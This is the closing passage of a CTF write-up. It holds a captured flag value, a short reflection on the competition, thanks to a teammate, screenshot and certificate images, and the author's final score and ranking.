<p><img src="https://user-images.githubusercontent.com/77807503/208268465-f4b92ff5-3ff2-47fa-b4f0-6f06026ff481.png" alt="2022-12-17-182532_1888x1032_scrot"></p>
<p>flag → <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>flag{59af40c07bc6f02b457aa4c15543da2d}</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<h1 id="conclusion">Conclusion</h1>
<p>I globally liked this CTF, there were some very interesting rooms and I learned new things so that’s a W</p>
<p>Thanks to everyone who participated and to my tm8 b0unce</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268486-dbb01cf2-d9fe-4558-ba25-322bd76d1aad.png" alt="certificate"></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268490-01653d9d-3f6c-4d60-a146-08cdf933b7cb.png" alt="2022-12-17-232956_1888x1032_scrot"></p>
<p>1479 pts - 53/1658 (my username at the time was 99makarov)</p>
]]></content>
        </item>
        
    </channel>
</rss>
